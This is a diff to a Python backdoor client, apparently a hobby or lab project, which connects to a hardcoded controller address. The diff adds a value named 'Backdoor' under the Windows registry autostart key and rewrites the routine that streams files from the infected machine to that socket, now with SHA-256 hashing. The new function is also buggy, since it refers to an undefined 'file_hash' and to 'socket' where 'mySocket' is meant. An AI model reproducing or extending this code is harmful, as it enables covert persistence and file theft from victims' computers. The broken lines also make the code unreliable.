@@ -14,9 +14,12 @@ import shutil
 from PIL import ImageGrab
 import tempfile
 import winreg as wrg
+import hashlib
 
 ip = "172.25.191.60"
 port = 8080
+chunksize = 1024
+hashAlgorithm = 'sha256'
 
 # https://www.geeksforgeeks.org/python/manipulating-windows-registry-using-winreg-in-python/
 def setAutostart():
@@ -31,17 +34,29 @@ def setAutostart():
             as key:
                 wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')
 
-def transfer(s, path):
-    if os.path.exists(path):
-        f = open (path, 'rb')
-        packet = f.read (5000)
-        while len(packet) > 0:
-            s.send(packet)
-            packet = f.read(1024)
-        f.close()
-        s.send('DONE'.encode())
-    else:
-        s.send('File not found'.encode())
+def sendFile(mySocket, path):
+    try:
+        # https://www.geeksforgeeks.org/python/how-to-get-file-size-in-python/
+        #socket.send(os.path.getsize(path)
+
+        fileHash = hashlib.new(hashAlgorithm)
+        with open(path, 'rb') as file:
+            # walrus operator so we loop for the whole file
+            while packet := file.read(chunksize):
+                # https://www.geeksforgeeks.org/python/python-program-to-find-hash-of-file/
+                fileHash.update(packet)
+                mySocket.send(packet)
+        mySocket.send('DONE'.encode())
+        hexdigest = file_hash.hexdigest()
+        mySocket.send(hexdigest.encode())
+
+    except FileNotFoundError:
+        socket.send('File not found'.encode())
+    except Exception as e:
+        socket.send('ERROR'.encode())
+        informToServer = "[+] Some error occured. " + str(e)
+        socket.send(informToServer.encode())
+
 
 def initiate():
     tuneConnection()
